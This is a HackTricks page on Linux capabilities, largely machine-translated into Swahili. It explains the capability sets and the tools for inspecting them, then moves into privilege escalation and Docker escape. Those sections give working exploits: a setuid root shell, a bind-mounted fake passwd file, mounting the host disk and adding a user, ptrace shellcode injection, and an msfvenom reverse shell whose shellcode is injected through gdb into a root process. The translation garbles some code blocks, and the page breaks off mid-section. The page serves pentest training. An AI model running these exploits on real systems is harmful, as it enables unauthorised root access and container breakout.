# Linux Capabilities

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **lengo la kukuza maarifa ya kiufundi**, kongamano hili ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila taaluma.\\

{% embed url="https://www.rootedcon.com/" %}

## Linux Capabilities

Linux capabilities zinagawanya **privileges za root katika vitengo vidogo, tofauti**, kuruhusu michakato kuwa na subset ya privileges. Hii inapunguza hatari kwa kutokupa privileges za root zisizohitajika.

### Tatizo:
- Watumiaji wa kawaida wana ruhusa ndogo, ikihusisha kazi kama kufungua socket ya mtandao ambayo inahitaji ufikiaji wa root.

### Seti za Uwezo:

1. **Inherited (CapInh)**:
- **Madhumuni**: Inabainisha uwezo unaopitishwa kutoka kwa mchakato wa mzazi.
- **Ufanisi**: Wakati mchakato mpya unaundwa, unarithi uwezo kutoka kwa mzazi katika seti hii. Ni muhimu kwa kudumisha privileges fulani wakati wa kuzalisha michakato.
- **Vikwazo**: Mchakato hauwezi kupata uwezo ambao mzazi wake hakuwa nao.

2. **Effective (CapEff)**:
- **Madhumuni**: Inawakilisha uwezo halisi ambao mchakato unatumia wakati wowote.
- **Ufanisi**: Ni seti ya uwezo inayokaguliwa na kernel ili kutoa ruhusa kwa shughuli mbalimbali. Kwa faili, seti hii inaweza kuwa bendera inayoashiria kama uwezo wa faili unaruhusiwa kuzingatiwa kuwa halisi.
- **Umuhimu**: Seti halisi ni muhimu kwa ukaguzi wa haraka wa privileges, ikifanya kazi kama seti ya uwezo inayotumika ambayo mchakato unaweza kutumia.

3. **Permitted (CapPrm)**:
- **Madhumuni**: Inabainisha seti ya juu ya uwezo ambayo mchakato unaweza kuwa nayo.
- **Ufanisi**: Mchakato unaweza kuinua uwezo kutoka kwa seti inayoruhusiwa hadi seti yake halisi, ikimpa uwezo wa kutumia uwezo huo. Pia inaweza kuondoa uwezo kutoka kwa seti yake inayoruhusiwa.
- **Mipaka**: Inafanya kazi kama kikomo cha juu kwa uwezo ambao mchakato unaweza kuwa nao, kuhakikisha mchakato hauzidi wigo wa privileges ulioainishwa.

4. **Bounding (CapBnd)**:
- **Madhumuni**: Inweka kikomo juu ya uwezo ambao mchakato unaweza kupata wakati wa maisha yake.
- **Ufanisi**: Hata kama mchakato una uwezo fulani katika seti yake inayoweza kurithiwa au inayoruhusiwa, hauwezi kupata uwezo huo isipokuwa pia uko katika seti ya bounding.
- **Matumizi**: Seti hii ni muhimu kwa kupunguza uwezo wa mchakato kupandisha privileges, ikiongeza safu ya ziada ya usalama.

5. **Ambient (CapAmb)**:
- **Madhumuni**: Inaruhusu uwezo fulani kudumishwa wakati wa wito wa mfumo wa `execve`, ambao kwa kawaida ungepelekea upya kamili wa uwezo wa mchakato.
- **Ufanisi**: Inahakikisha kwamba programu zisizo za SUID ambazo hazina uwezo wa faili zinazohusiana zinaweza kudumisha privileges fulani.
- **Vikwazo**: Uwezo katika seti hii unategemea vikwazo vya seti zinazoweza kurithiwa na zinazoruhusiwa, kuhakikisha hazipiti privileges zilizoidhinishwa za mchakato.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Kwa maelezo zaidi angalia:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Uwezo wa Mchakato & Binaries

### Uwezo wa Mchakato

Ili kuona uwezo wa mchakato maalum, tumia faili ya **status** katika saraka ya /proc. Kwa kuwa inatoa maelezo zaidi, hebu tuipunguze kwa habari zinazohusiana na uwezo wa Linux.\
Kumbuka kwamba kwa mchakato wote unaotembea, habari za uwezo zinahifadhiwa kwa kila thread, kwa binaries katika mfumo wa faili zinahifadhiwa katika sifa za kupanuliwa.

Unaweza kupata uwezo ulioainishwa katika /usr/include/linux/capability.h

Unaweza kupata uwezo wa mchakato wa sasa katika `cat /proc/self/status` au kufanya `capsh --print` na wa watumiaji wengine katika `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Hii amri inapaswa kurudisha mistari 5 kwenye mifumo mingi.

* CapInh = Uwezo ulio urithiwa
* CapPrm = Uwezo ulio ruhusiwa
* CapEff = Uwezo halisi
* CapBnd = Seti ya mipaka
* CapAmb = Seti ya uwezo wa mazingira
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Hizi nambari za hexadecimal hazina maana. Kwa kutumia zana ya capsh tunaweza kuzifasiri kuwa majina ya uwezo.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Hebu tuangalia sasa **uwezo** unaotumiwa na `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Ingawa hiyo inafanya kazi, kuna njia nyingine na rahisi. Ili kuona uwezo wa mchakato unaoendelea, tumia tu chombo cha **getpcaps** ikifuatiwa na kitambulisho chake cha mchakato (PID). Unaweza pia kutoa orodha ya vitambulisho vya michakato.
```bash
getpcaps 1234
```
Hebu tuangalie hapa uwezo wa `tcpdump` baada ya kumpa binary uwezo wa kutosha (`cap_net_admin` na `cap_net_raw`) ili kuchambua mtandao (_tcpdump inakimbia katika mchakato 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Kama unavyoona, uwezo uliopewa unalingana na matokeo ya njia 2 za kupata uwezo wa binary.\
Zana ya _getpcaps_ inatumia wito wa mfumo wa **capget()** kuuliza uwezo unaopatikana kwa nyuzi maalum. Wito huu wa mfumo unahitaji tu kutoa PID ili kupata maelezo zaidi.

### Uwezo wa Binaries

Binaries zinaweza kuwa na uwezo ambao unaweza kutumika wakati wa kutekeleza. Kwa mfano, ni kawaida sana kupata binary ya `ping` ikiwa na uwezo wa `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Unaweza **kutafuta binaries zenye uwezo** kwa kutumia:
```bash
getcap -r / 2>/dev/null
```
### Kutupa uwezo na capsh

Ikiwa tutatua uwezo wa CAP\_NET\_RAW kwa _ping_, basi matumizi ya ping hayapaswi kufanya kazi tena.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Besides the output of _capsh_ itself, the _tcpdump_ command itself should also raise an error.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

The error clearly shows that the ping command is not allowed to open an ICMP socket. Now we know for sure that this works as expected.

### Ondoa Uwezo

You can remove capabilities of a binary with
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Kwa kweli **inawezekana kutoa uwezo pia kwa watumiaji**. Hii ina maana kwamba kila mchakato unaotekelezwa na mtumiaji utaweza kutumia uwezo wa watumiaji.\
Kulingana na [hii](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [hii](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) na [hii](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) faili chache mpya zinahitaji kusanidiwa ili kumpa mtumiaji uwezo fulani lakini ile inayotoa uwezo kwa kila mtumiaji itakuwa `/etc/security/capability.conf`.\
Mfano wa faili:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Environment Capabilities

Kwa kukusanya programu ifuatayo inawezekana **kuanzisha shell ya bash ndani ya mazingira yanayotoa uwezo**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Ndani ya **bash inayotekelezwa na binary ya mazingira iliyokusanywa** inawezekana kuona **uwezo mpya** (mtumiaji wa kawaida hatakuwa na uwezo wowote katika sehemu ya "sasa").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Unaweza **kuongeza tu uwezo ambao upo** katika seti za ruhusa na zinazorithishwa.
{% endhint %}

### Binaries zenye Uwezo/Binaries zisizo na Uwezo

**Binaries zenye uwezo hazitatumia uwezo mpya** uliopewa na mazingira, hata hivyo **binaries zisizo na uwezo zitawatumia** kwani hazitakataa. Hii inafanya binaries zisizo na uwezo kuwa hatarini ndani ya mazingira maalum yanayotoa uwezo kwa binaries.

## Uwezo wa Huduma

Kwa default, **huduma inayotembea kama root itakuwa na uwezo wote uliotolewa**, na katika baadhi ya matukio hii inaweza kuwa hatari.\
Kwa hivyo, faili ya **mipangilio ya huduma** inaruhusu **kueleza** **uwezo** unayotaka iwe nao, **na** **mtumiaji** anayeweza kutekeleza huduma ili kuepuka kuendesha huduma yenye ruhusa zisizohitajika:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Uwezo katika Maktaba za Docker

Kwa default, Docker inatoa uwezo kadhaa kwa maktaba. Ni rahisi sana kuangalia ni uwezo gani hawa kwa kukimbia:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **lengo la kukuza maarifa ya kiufundi**, kongamano hili ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila taaluma.

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

Uwezo ni muhimu unapohitaji **kuzuia michakato yako mwenyewe baada ya kufanya operesheni zenye mamlaka** (mfano, baada ya kuweka chroot na kuunganisha kwenye socket). Hata hivyo, zinaweza kutumika vibaya kwa kupitisha amri au hoja mbaya ambazo kisha zinafanywa kama root.

Unaweza kulazimisha uwezo kwa programu kwa kutumia `setcap`, na kuuliza hizi kwa kutumia `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
The `+ep` inamaanisha unongeza uwezo (“-” ungeondoa) kama Ufanisi na Uidhinishwa.

Ili kubaini programu katika mfumo au folda zenye uwezo:
```bash
getcap -r / 2>/dev/null
```
### Mfano wa Ukatili

Katika mfano ufuatao, binary `/usr/bin/python2.6` imepatikana kuwa na udhaifu wa privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Uwezo** unaohitajika na `tcpdump` ili **kuruhusu mtumiaji yeyote kunusa pakiti**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Hali maalum ya uwezo "bila"

[Kutoka kwenye nyaraka](https://man7.org/linux/man-pages/man7/capabilities.7.html): Kumbuka kwamba mtu anaweza kupeana seti za uwezo zisizo na kitu kwa faili la programu, na hivyo inawezekana kuunda programu ya set-user-ID-root ambayo inabadilisha set-user-ID halisi na iliyohifadhiwa ya mchakato unaotekeleza programu hiyo kuwa 0, lakini haina uwezo wowote kwa mchakato huo. Au, kwa kusema kwa urahisi, ikiwa una binary ambayo:

1. haimilikiwi na root
2. haina bits za `SUID`/`SGID` zilizowekwa
3. ina seti za uwezo zisizo na kitu (mfano: `getcap myelf` inarudisha `myelf =ep`)

basi **binary hiyo itakimbia kama root**.

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** ni uwezo wa Linux wenye nguvu sana, mara nyingi unalinganishwa na kiwango cha karibu na root kutokana na **privileges za kiutawala** zake kubwa, kama vile kuunganisha vifaa au kubadilisha vipengele vya kernel. Ingawa ni muhimu kwa kontena zinazofanana na mifumo kamili, **`CAP_SYS_ADMIN` inatoa changamoto kubwa za usalama**, hasa katika mazingira ya kontena, kutokana na uwezo wake wa kupandisha hadhi na kuathiri mfumo. Kwa hivyo, matumizi yake yanahitaji tathmini kali za usalama na usimamizi wa tahadhari, huku kukiwa na upendeleo mkubwa wa kuondoa uwezo huu katika kontena maalum za programu ili kuzingatia **kanuni ya hadhi ndogo** na kupunguza uso wa shambulio.

**Mfano na binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Kwa kutumia python unaweza kuunganisha faili iliyobadilishwa _passwd_ juu ya faili halisi _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Na hatimaye **mount** faili la `passwd` lililobadilishwa kwenye `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Na utaweza **`su` kama root** ukitumia nenosiri "password".

**Mfano na mazingira (Docker breakout)**

Unaweza kuangalia uwezo ulioanzishwa ndani ya kontena la docker ukitumia:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Ndani ya matokeo ya awali unaweza kuona kwamba uwezo wa SYS\_ADMIN umewezeshwa.

* **Mount**

Hii inaruhusu kontena la docker **kuweka diski ya mwenyeji na kuipata kwa uhuru**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Upatikanaji kamili**

Katika njia iliyopita tulifanikiwa kufikia diski ya mwenyeji wa docker.\
Ikiwa utagundua kwamba mwenyeji anafanya kazi na seva ya **ssh**, unaweza **kuunda mtumiaji ndani ya diski ya mwenyeji wa docker** na kuipata kupitia SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**Hii inamaanisha kwamba unaweza kutoroka kwenye kontena kwa kuingiza shellcode ndani ya mchakato fulani unaotembea ndani ya mwenyeji.** Ili kufikia michakato inayotembea ndani ya mwenyeji, kontena linahitaji kuendeshwa angalau na **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** inatoa uwezo wa kutumia kazi za ufuatiliaji na ufuatiliaji wa wito wa mfumo zinazotolewa na `ptrace(2)` na wito za kuunganisha msongamano wa kumbukumbu kama `process_vm_readv(2)` na `process_vm_writev(2)`. Ingawa ni nguvu kwa ajili ya madhumuni ya uchunguzi na ufuatiliaji, ikiwa `CAP_SYS_PTRACE` imewezeshwa bila hatua za kikomo kama vile filamu ya seccomp kwenye `ptrace(2)`, inaweza kudhoofisha usalama wa mfumo kwa kiasi kikubwa. Kwa haswa, inaweza kutumika kukwepa vizuizi vingine vya usalama, hasa vile vilivyowekwa na seccomp, kama inavyoonyeshwa na [uthibitisho wa dhana (PoC) kama hii](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Mfano na binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Mfano na binary (gdb)**

`gdb` na uwezo wa `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
```markdown
# Kuunda shellcode na msfvenom ili kuingiza kwenye kumbukumbu kupitia gdb

## Hatua za Kutekeleza

1. **Tengeneza Shellcode**  
   Tumia msfvenom kuunda shellcode. Mfano:
   ```bash
   msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP yako> LPORT=<bandari yako> -f c
   ```

2. **Kuhifadhi Shellcode**  
   Hifadhi shellcode kwenye faili ili uweze kuingiza kwenye gdb.

3. **Kuingiza Shellcode kwenye gdb**  
   Anza gdb na programu unayotaka kujaribu, kisha tumia amri za gdb kuingiza shellcode kwenye kumbukumbu.

## Mfano wa Kuingiza Shellcode

```bash
gdb ./program
(gdb) run
(gdb) set {char[<urefu>]} = {<shellcode>}
```
```
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
```markdown
Debug a root process with gdb na nakala-pasta mistari ya gdb iliyozalishwa hapo awali:
```
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Mfano na mazingira (Docker breakout) - Matumizi mengine ya gdb**

Ikiwa **GDB** imewekwa (au unaweza kuisakinisha kwa `apk add gdb` au `apt install gdb` kwa mfano) unaweza **kuchunguza mchakato kutoka kwa mwenyeji** na kufanya uitwe kazi ya `system`. (Tekniki hii pia inahitaji uwezo `SYS_ADMIN`)**.**
```bash
